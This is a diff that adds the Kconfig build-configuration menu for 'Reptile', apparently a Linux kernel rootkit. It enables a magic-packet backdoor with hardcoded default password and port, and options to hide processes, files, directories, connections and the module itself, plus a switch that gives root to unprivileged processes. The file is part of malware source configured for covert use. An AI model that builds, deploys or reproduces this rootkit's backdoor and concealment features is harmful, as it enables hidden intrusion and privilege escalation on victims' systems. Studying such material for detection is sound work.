@@ -1,0 +1,68 @@
+mainmenu "Reptile's configuration"
+
+comment "Chose the features you wanna enable"
+
+config CONFIG_BACKDOOR
+    bool "Backdoor"
+    default y
+
+menu "Backdoor configuration"
+    depends on CONFIG_BACKDOOR
+        
+    config MAGIC_VALUE
+        string "Magic value to magic packets"
+        default "hax0r"
+
+    config PASSWORD
+        string "Backdoor password"
+        default "s3cr3t"
+
+    config SRCPORT
+        int "Source port of magic packets"
+        default 666
+        range 0 65535
+
+    comment "END"
+endmenu 
+
+config CONFIG_FILE_TAMPERING
+    bool "Hide specific file contents"
+    default y
+
+menu "Name used in file tampering tags"
+    depends on CONFIG_FILE_TAMPERING
+    
+    config TAG_NAME
+        string "Tag name that hide file contents"
+        default "reptile"
+                
+    comment "END"
+endmenu
+
+config CONFIG_HIDE_PROC
+    bool "Hide process"
+    default y
+
+config CONFIG_HIDE_DIR
+    bool "Hide files and directories"
+    default y
+    
+menu "Hide name (needed to create Reptile's folder)"
+    config HIDE
+        string "Hide name"
+        default "reptile"
+            
+    comment "END"
+endmenu
+
+config CONFIG_HIDE_CONN
+    bool "Hide TCP and UDP connections"
+    default y
+
+config CONFIG_AUTO_HIDE
+    bool "Hide kernel module itself"
+    default y
+
+config CONFIG_GIVE_ROOT
+    bool "Enable give root to a process run by an unprivileged user"
+    default y
